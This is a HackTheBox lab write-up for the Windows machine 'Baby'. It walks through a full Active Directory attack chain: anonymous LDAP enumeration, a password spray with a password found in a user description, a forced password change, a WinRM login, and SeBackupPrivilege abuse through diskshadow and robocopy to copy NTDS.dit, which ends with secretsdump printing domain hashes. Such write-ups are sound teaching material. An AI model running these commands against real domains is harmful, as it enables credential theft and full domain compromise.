---
layout: post
title: "[HTB] Baby"
description: "[Machine] - Easy difficulty"
background: '/img/bg-machine.jpg'
tags: [htb]
difficulty: Easy
---

![](/img/htb_img/Baby_img/img1.png)

- OS: Windows
- Release Date: 18 Sep 2025
- Difficulty: Easy

# Enumeration
## Nmap recon
```
└──╼ #nmap -p- --min-rate 5000 -sS -Pn -n -vvv -oG allports $target
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-27 11:09 CDT
Initiating SYN Stealth Scan at 11:09
Scanning 10.xx.xx.xx [65535 ports]
Completed SYN Stealth Scan at 11:10, 52.67s elapsed (65535 total ports)
Nmap scan report for 10.xx.xx.xx
Host is up, received user-set (0.011s latency).
Scanned at 2025-09-27 11:09:40 CDT for 53s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49979/tcp open  unknown          syn-ack ttl 127
50515/tcp open  unknown          syn-ack ttl 127
61473/tcp open  unknown          syn-ack ttl 127
61474/tcp open  unknown          syn-ack ttl 127
61483/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 52.77 seconds
           Raw packets sent: 262118 (11.533MB) | Rcvd: 101 (6.404KB)

```

Scripts and versions.
```
└──╼ #nmap -p 53,88,135,389,445,464,593,636,3268,3269,5985,9389 -sCV -oN targeted $target
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-27 11:12 CDT
Nmap scan report for 10.xx.xx.xx
Host is up (0.21s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-27 16:12:49Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-27T16:12:53
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.23 seconds
```

This is giving Domain Controller vibe, and it is `baby.vl`.
Let's add this to the hosts file aswell as the DC. We can use `netexec` to generate the necessary hostnames.

```
❯ nxc smb $target --generate-hosts-file hosts
SMB         10.xx.xx.xx  445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
```

As we can see, the `BABYDC` is the domain controller. We can append the `hosts` file generated by netexec to our hosts file.
```
❯ cat hosts
───────┬─────────────────────────────────────────────────────────────────────────
       │ File: hosts
───────┼─────────────────────────────────────────────────────────────────────────
   1   │ 10.xx.xx.xx     BABYDC.baby.vl baby.vl BABYDC
───────┴─────────────────────────────────────────────────────────────────────────
```

```
❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

After this we can continue with the reconnaisance.
On the nmap report we can see a clock skew so it's necessary to sync with the kerberos clock for further attacks.
```
❯ sudo timedatectl set-ntp false

❯ sudo ntpdate BABYDC.baby.vl
2025-09-28 13:02:33.058551 (+0200) +0.054911 +/- 0.094534 BABYDC.baby.vl 10.xx.xx.xx s1 no-leap
```

## TCP 445 - SMB
```
❯ nxc smb $target -u guest -p '' --shares
SMB         10.xx.xx.xx  445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.xx.xx.xx  445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED 

❯ nxc smb $target -u bombastic -p '' --shares
SMB         10.xx.xx.xx  445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.xx.xx.xx  445    BABYDC           [-] baby.vl\bombastic: STATUS_LOGON_FAILURE 

❯ nxc smb $target -u guest -p '' --rid-brute
SMB         10.xx.xx.xx  445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.xx.xx.xx  445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED 

```


## TCP 389 - Ldap
```
❯ nxc ldap BABYDC.baby.vl -u '' -p '' --query "(objectClass=*)" "" | grep "Response for object:"
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Administrator,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Guest,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=krbtgt,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Domain Computers,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Schema Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Domain Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Domain Users,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Domain Guests,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Protected Users,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Key Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=dev,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Hugh George,OU=dev,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Ian Walker,OU=dev,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=it,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

Let's full dump the users.
```
❯ nxc ldap BABYDC.baby.vl -u '' -p '' --query "(sAMAccountName=*)" "" > users_dump.txt

LDAP                     10.xx.xx.xx  389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP                     10.xx.xx.xx  389    BABYDC           [+] baby.vl\: 
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           objectClass          top
LDAP                     10.xx.xx.xx  389    BABYDC                                group
LDAP                     10.xx.xx.xx  389    BABYDC           cn                   Allowed RODC Password Replication Group
LDAP                     10.xx.xx.xx  389    BABYDC           description          Members in this group can have their passwords replicated to all read-only domain controllers in the domain
LDAP                     10.xx.xx.xx  389    BABYDC           distinguishedName    CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           instanceType         4
LDAP                     10.xx.xx.xx  389    BABYDC           whenCreated          20211121145158.0Z
LDAP                     10.xx.xx.xx  389    BABYDC           whenChanged          20211121145158.0Z
LDAP                     10.xx.xx.xx  389    BABYDC           uSNCreated           12402
LDAP                     10.xx.xx.xx  389    BABYDC           uSNChanged           12404
LDAP                     10.xx.xx.xx  389    BABYDC           name                 Allowed RODC Password Replication Group
LDAP                     10.xx.xx.xx  389    BABYDC           objectGUID           7a320b26-be6c-8344-a875-344eb415a428
LDAP                     10.xx.xx.xx  389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-571
LDAP                     10.xx.xx.xx  389    BABYDC           sAMAccountName       Allowed RODC Password Replication Group
LDAP                     10.xx.xx.xx  389    BABYDC           sAMAccountType       536870912
LDAP                     10.xx.xx.xx  389    BABYDC           groupType            -2147483644
LDAP                     10.xx.xx.xx  389    BABYDC           objectCategory       CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           isCriticalSystemObject TRUE
LDAP                     10.xx.xx.xx  389    BABYDC           dSCorePropagationData 20211121163013.0Z
LDAP                     10.xx.xx.xx  389    BABYDC                                20211121145159.0Z
LDAP                     10.xx.xx.xx  389    BABYDC                                16010101000417.0Z
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           objectClass          top
LDAP                     10.xx.xx.xx  389    BABYDC                                person
LDAP                     10.xx.xx.xx  389    BABYDC                                organizationalPerson
LDAP                     10.xx.xx.xx  389    BABYDC                                user
LDAP                     10.xx.xx.xx  389    BABYDC           cn                   Ashley Webb
LDAP                     10.xx.xx.xx  389    BABYDC           sn                   Webb
LDAP                     10.xx.xx.xx  389    BABYDC           givenName            Ashley
LDAP                     10.xx.xx.xx  389    BABYDC           distinguishedName    CN=Ashley Webb,OU=dev,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           instanceType         4
LDAP                     10.xx.xx.xx  389    BABYDC           whenCreated          20211121151103.0Z
LDAP                     10.xx.xx.xx  389    BABYDC           whenChanged          20211121151103.0Z
LDAP                     10.xx.xx.xx  389    BABYDC           displayName          Ashley Webb
LDAP                     10.xx.xx.xx  389    BABYDC           uSNCreated           12803
LDAP                     10.xx.xx.xx  389    BABYDC           memberOf             CN=dev,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           uSNChanged           12808
LDAP                     10.xx.xx.xx  389    BABYDC           name                 Ashley Webb
LDAP                     10.xx.xx.xx  389    BABYDC           objectGUID           3f551e09-c519-1943-bac7-2c21ff71b0fe
LDAP                     10.xx.xx.xx  389    BABYDC           userAccountControl   66080
LDAP                     10.xx.xx.xx  389    BABYDC           badPwdCount          0
LDAP                     10.xx.xx.xx  389    BABYDC           codePage             0
LDAP                     10.xx.xx.xx  389    BABYDC           countryCode          0
LDAP                     10.xx.xx.xx  389    BABYDC           badPasswordTime      0
LDAP                     10.xx.xx.xx  389    BABYDC           lastLogoff           0
LDAP                     10.xx.xx.xx  389    BABYDC           lastLogon            0
LDAP                     10.xx.xx.xx  389    BABYDC           pwdLastSet           132819810633407081
LDAP                     10.xx.xx.xx  389    BABYDC           primaryGroupID       513
LDAP                     10.xx.xx.xx  389    BABYDC           objectSid            S-1-5-21-1407081343-4001094062-1444647654-1105
LDAP                     10.xx.xx.xx  389    BABYDC           accountExpires       9223372036854775807
LDAP                     10.xx.xx.xx  389    BABYDC           logonCount           0
LDAP                     10.xx.xx.xx  389    BABYDC           sAMAccountName       Ashley.Webb
LDAP                     10.xx.xx.xx  389    BABYDC           sAMAccountType       805306368
LDAP                     10.xx.xx.xx  389    BABYDC           userPrincipalName    Ashley.Webb@baby.vl
LDAP                     10.xx.xx.xx  389    BABYDC           objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           dSCorePropagationData 20211121163014.0Z
LDAP                     10.xx.xx.xx  389    BABYDC                                20211121162927.0Z
LDAP                     10.xx.xx.xx  389    BABYDC                                16010101000416.0Z
LDAP                     10.xx.xx.xx  389    BABYDC           [+] Response for object: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           objectClass          top
LDAP                     10.xx.xx.xx  389    BABYDC                                group
LDAP                     10.xx.xx.xx  389    BABYDC           cn                   Cert Publishers
...
```

I put all of this info in a file and grepped for interesting words and parameters, finding this:
```
❯ cat users_dump.txt | grep -A 5 -B 5 password
<...>
LDAP                     10.xx.xx.xx  389    BABYDC                                person
LDAP                     10.xx.xx.xx  389    BABYDC                                organizationalPerson
LDAP                     10.xx.xx.xx  389    BABYDC                                user
LDAP                     10.xx.xx.xx  389    BABYDC           cn                   Teresa Bell
LDAP                     10.xx.xx.xx  389    BABYDC           sn                   Bell
LDAP                     10.xx.xx.xx  389    BABYDC           description          Set initial password to BabyStart123!
LDAP                     10.xx.xx.xx  389    BABYDC           givenName            Teresa
LDAP                     10.xx.xx.xx  389    BABYDC           distinguishedName    CN=Teresa Bell,OU=it,DC=baby,DC=vl
LDAP                     10.xx.xx.xx  389    BABYDC           instanceType         4
LDAP                     10.xx.xx.xx  389    BABYDC           whenCreated          20211121151108.0Z
LDAP                     10.xx.xx.xx  389    BABYDC           whenChanged          20211121151437.0Z
```

So, here we can see that Teresa.Bell has intial password: `BabyStart123!`.
We can try out this password with the list of users.
To get a full list of users we can use the following oneliner:
```
❯ nxc ldap BABYDC.baby.vl -u '' -p '' --query "(objectClass=*)" "" \
  | grep "Response for object:" \
  | awk -F: '{print $2}' \
  | sed 's/CN=//g' \
  | awk -F, '{print $1}' \
  | sed 's/^ //' \
  | tr ' ' '.' > users.txt

```

This way we can generate the following list of users.
```
Administrator
Guest
krbtgt
Domain.Computers
Domain.Controllers
Schema.Admins
Enterprise.Admins
Cert.Publishers
Domain.Admins
Domain.Users
Domain.Guests
Group.Policy.Creator.Owners
RAS.and.IAS.Servers
Allowed.RODC.Password.Replication.Group
Denied.RODC.Password.Replication.Group
Read-only.Domain.Controllers
Enterprise.Read-only.Domain.Controllers
Cloneable.Domain.Controllers
Protected.Users
Key.Admins
Enterprise.Key.Admins
DnsAdmins
DnsUpdateProxy
dev
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Ian.Walker
it
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson
```

Using this list we can try a password spray

### Password Spray
```
❯ nxc ldap BABYDC.baby.vl -u users.txt -p 'BabyStart123!'
LDAP        10.xx.xx.xx  389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Administrator:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\krbtgt:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Domain.Computers:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Domain.Controllers:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Schema.Admins:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Enterprise.Admins:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Cert.Publishers:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Domain.Admins:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Domain.Users:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Domain.Guests:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Group.Policy.Creator.Owners:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\RAS.and.IAS.Servers:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Allowed.RODC.Password.Replication.Group:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Denied.RODC.Password.Replication.Group:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Read-only.Domain.Controllers:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Enterprise.Read-only.Domain.Controllers:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Cloneable.Domain.Controllers:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Protected.Users:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Key.Admins:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Enterprise.Key.Admins:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\DnsAdmins:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\DnsUpdateProxy:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\dev:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\it:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        10.xx.xx.xx  389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

And we got a hit on the last one. The flag says that a password change is needed.

# Foothold
## Password change
Using Netexec we can try to change the password:
```
❯ nxc smb BABYDC.baby.vl -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS=P@ssword123!
SMB         10.xx.xx.xx   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.xx.xx.xx   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... 10.xx.xx.xx   445    BABYDC           [+] Successfully changed password for Caroline.Robinson
```

This took a while to get because I had the `netexec` version installed from `aptitude`, which does not have all the modules configured.
To fix this I needed to purge the `netexec` package and install it directly from the github page using `pipx`.
```
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

After this, all the modules are correctly loaded (This method only works for amd64. If you have a Kali VM running on, for example, a macbook Silicon, this method will not work for arm64, you are basically stuck with the `aptitude` package hehe).

So, now Caroline's password is `P@ssword123!`, so let's try to login.

## Caroline.Robinson - WinRM
```
❯ evil-winrm -i BABYDC.baby.vl -u 'caroline.robinson' -p 'P@ssword123!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> 
```

### User.txt
```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> dir


    Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         9/29/2025   3:17 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> type user.txt
<REDACTED>
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop>
```


# Privilege Escalation
```
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
baby\caroline.robinson S-1-5-21-1407081343-4001094062-1444647654-1115


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

As we can see we have `SeBackupPrivilege`.
We will be extracting domain hashes through NTDS.dit

## Extracting domain hashes
Creating a script and transforming it to DOS format, as learned from `0xdf`.
```
nvim backup

set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\funny.cab
add volume c: alias funny
create
expose %funny% e:

unix2dos backup

```

Upload it to the machine:
```
*Evil-WinRM* PS C:\Temp> upload backup
                                        
Info: Uploading /home/kali/HTB/Machines/Baby/content/backup to C:\Temp\backup
```

We now pass it to `diskshadow`:
```
*Evil-WinRM* PS C:\programdata> diskshadow /s C:\programdata\backup
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  9/29/2025 4:03:20 PM

-> set verbose on
-> set context persistent nowriters
-> set metadata C:\Windows\Temp\funny.cab
-> add volume c: alias funny
-> create

Alias funny for shadow ID {d290f74c-3277-48a3-960f-ebf1f15b2475} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {78a11489-ce13-432e-9bea-6c9bce7ecd19} set as environment variable.
Inserted file Manifest.xml into .cab file funny.cab
Inserted file Dis6502.tmp into .cab file funny.cab

Querying all shadow copies with the shadow copy set ID {78a11489-ce13-432e-9bea-6c9bce7ecd19}

	* Shadow copy ID = {d290f74c-3277-48a3-960f-ebf1f15b2475}		%funny%
		- Shadow copy set: {78a11489-ce13-432e-9bea-6c9bce7ecd19}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 9/29/2025 4:03:20 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: BabyDC.baby.vl
		- Service machine: BabyDC.baby.vl
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %funny% e:
-> %funny% = {d290f74c-3277-48a3-960f-ebf1f15b2475}
The shadow copy was successfully exposed as e:\.
->
```

With this, the script created a copy of the C: drive at E:, and in this case the NTDS.dit file is no longer being used and can be copied with `robocopy` for example.

```
*Evil-WinRM* PS C:\programdata> robocopy /b E:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, September 29, 2025 4:05:30 PM
   Source : E:\Windows\ntds\
     Dest : C:\programdata\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                  1	E:\Windows\ntds\
	   New File  		 16.0 m	ntds.dit
  0.0%
  0.3%
  0.7%
 <...>
 99.6%
100%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           153,919,412 Bytes/sec.
   Speed :             8,807.340 MegaBytes/min.
   Ended : Monday, September 29, 2025 4:05:30 PM
```

We download it to local, get the system and extract the hashes with `secretsdump`.

```
*Evil-WinRM* PS C:\programdata> reg save hklm\system system
The operation completed successfully.

*Evil-WinRM* PS C:\programdata> download system
                                        
Info: Downloading C:\programdata\system to system
Progress: 61% : |▓▓▓▓▓▒░░░░|
```

```
❯ impacket-secretsdump -ntds ntds.dit -system system LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
